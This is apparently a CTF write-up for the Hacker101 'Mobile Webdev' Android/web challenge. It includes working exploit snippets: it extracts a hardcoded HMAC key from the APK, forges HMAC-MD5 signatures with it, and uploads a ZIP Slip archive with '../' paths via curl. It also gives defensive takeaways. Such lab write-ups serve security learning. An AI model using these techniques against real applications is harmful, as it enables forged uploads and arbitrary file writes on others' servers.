# Mobile Webdev

**Platform:** HackerOne CTF
**Challenge:** Mobile Webdev (Level 18)
**Difficulty:** Moderate
**Category:** Android / Web
**Flags:** 2

---

## Overview

An Android application that functions as a content editor. The app embeds a WebView and loads remote web content from a server. The server provides a content editing interface and a ZIP upload endpoint protected by an HMAC signature. The HMAC key is hardcoded in the APK source code.

**Hints provided:**
- "Make sure you understand what you're up against"
- "Look for all functionality"
- "Sometimes unfinished code can give you a leg up"
- "This function is clearly broken"
- "Try the ... direct route"

**Server:** openresty/1.29.2.4

---

## Reconnaissance

### Application Behavior

The APK (`com.hacker101.webdev`) contains a single activity that loads a WebView pointing to `/content/`. Two buttons toggle between viewing content and editing via `/edit.php`.

| Page/Endpoint | Method | Purpose |
|---------------|--------|---------|
| / | GET | Root - links to webdev.apk download |
| /content/ | GET | Displays user-editable HTML content |
| /edit.php | GET | Content editor with file listing |
| /edit.php?file= | GET | Edit specific file from content directory |
| /save.php | POST | Save edited content (requires `file` + `data`) |
| /upload.php | GET/POST | Upload ZIP archives (requires HMAC signature) |

### Key Findings

1. **Hardcoded HMAC key in APK:** The `MainActivity.java` source exposes `HmacKey = "8c34bac50d9b096d41cafb53683b315690acf65a11b5f63250c61f7718fa1d1d"` - a 256-bit key stored in the decompiled Java source code.

2. **Broken/unfinished Hmac() function:** The `Hmac(byte[])` method throws `Exception("TODO: Implement this and expose to JS")` — indicating it was meant to be exposed to the WebView's JavaScript runtime but was never implemented.

3. **Unexposed upload.php:** The upload endpoint is not linked from the main app UI — it was discovered by enumerating server traffic. It accepts ZIP files but requires an HMAC signature for validation.

4. **ZIP Slip vulnerability:** The upload endpoint extracts ZIP archives to a temp directory and the extraction is vulnerable to path traversal through malicious filenames containing `../`.

---

## Flag 0 — Hardcoded HMAC Key Exposed in APK

**Method:** Extract HMAC key from APK source, sign ZIP with HMAC-MD5, upload

### Vulnerability

The Android APK embeds a 256-bit HMAC key in plaintext in `MainActivity.java`. The `/upload.php` endpoint on the server uses this same key (as HMAC-MD5) to authenticate ZIP uploads. By decompiling the APK, the key is trivially recovered and can be used to sign arbitrary uploads.

```java
// MainActivity.java (decompiled)
protected String HmacKey = "8c34bac50d9b096d41cafb53683b315690acf65a11b5f63250c61f7718fa1d1d";
```

### Exploit

The upload endpoint expects HMAC-MD5 (16-byte output, 32 hex chars) of the ZIP file content, using the raw bytes of the HMAC key.

```python
hmac_key = bytes.fromhex("8c34bac50d9b096d41cafb53683b315690acf65a11b5f63250c61f7718fa1d1d")
sig = hmac.new(hmac_key, zip_data, hashlib.md5).hexdigest()
```

```bash
curl -sk -X POST "$URL/upload.php" \
  -F "file=@test.zip;type=application/zip" \
  -F "hmac=$(python3 -c '...')"
```

Response:
```
Extracted to temp folder. TODO: Copy to content directory.
^FLAG^<redacted>$FLAG$
```

> **Flag 0:** `^FLAG^<redacted>$FLAG$`

**Takeaway:** Never store cryptographic secrets in client-side code. Mobile APKs can be trivially decompiled with tools like `jadx` or `apktool`, exposing any embedded keys, tokens, or credentials.

---

## Flag 1 — Path Traversal via ZIP Slip

**Method:** Create ZIP archive with `../` filenames, sign with HMAC-MD5, upload

### Vulnerability

The `/upload.php` endpoint extracts ZIP archives without sanitizing filenames for path traversal sequences (`../`). This is a classic **ZIP Slip vulnerability** (CWE-22). When a ZIP entry contains a relative path like `../../../tmp/evil.txt`, the extraction writes the file outside the intended temp directory.

### Exploit

Create a ZIP with a path-traversal filename, sign it with the same HMAC-MD5 key:

```python
zip_buf = io.BytesIO()
with zipfile.ZipFile(zip_buf, 'w') as zf:
    zf.writestr('../../../tmp/evil.txt', 'zip slip payload')
```

Both flags are returned in the same response when valid HMAC + path traversal are detected:

```bash
curl -sk -X POST "$URL/upload.php" \
  -F "file=@evil.zip;type=application/zip" \
  -F "hmac=<HMAC-MD5-sig>"
```

Response:
```
Valid HMAC: ^FLAG^<redacted>$FLAG$
Path traversal: ^FLAG^<redacted>$FLAG$
```

> **Flag 1:** `^FLAG^<redacted>$FLAG$`

**Takeaway:** Always sanitize filenames when extracting archives. Use `ZipEntry.getName()` with validation to reject entries containing `..` or absolute paths. Modern ZIP libraries provide safe extraction methods like `ZipFile.extract()` with path validation.

---

## Complete Flag List

| Flag | Hex | Technique |
|:----:|-----|-----------|
| 0 | `<redacted>` | HMAC-MD5 key extraction from APK + signed ZIP upload |
| 1 | `<redacted>` | ZIP Slip path traversal via `../` in filenames |

---

## Key Takeaways

1. **Client-side secrets are not secrets:** Mobile APKs can be decompiled in seconds. Never embed API keys, HMAC secrets, or tokens in client applications. Store them server-side or use secure enclaves.

2. **Enumerate all endpoints:** The `/upload.php` endpoint was not exposed in the UI. Always scan for hidden endpoints, check robots.txt, and look at intercepted traffic.

3. **ZIP Slip is still relevant:** Archive extraction without filename sanitization remains a common vulnerability. Even when the extracted directory isn't directly web-accessible, path traversal can reach sensitive locations.

4. **HMAC protects integrity, not secrecy:** The HMAC key being embedded in the client defeats its purpose entirely — anyone with the APK can forge valid signatures.

---

## Files

| File | Description |
|------|-------------|
| `solve.py` | Complete PoC — automates both flag captures |

## Usage

```bash
pip install requests
python3 solve.py https://<instance-id>.ctf.hacker101.com/
```

---

## References

- [HackerOne CTF Platform](https://ctf.hacker101.com/)
- [ZIP Slip Vulnerability (Snyk)](https://github.com/snyk/zip-slip-vulnerability)
- [Android APK Decompilation with jadx](https://github.com/skylot/jadx)
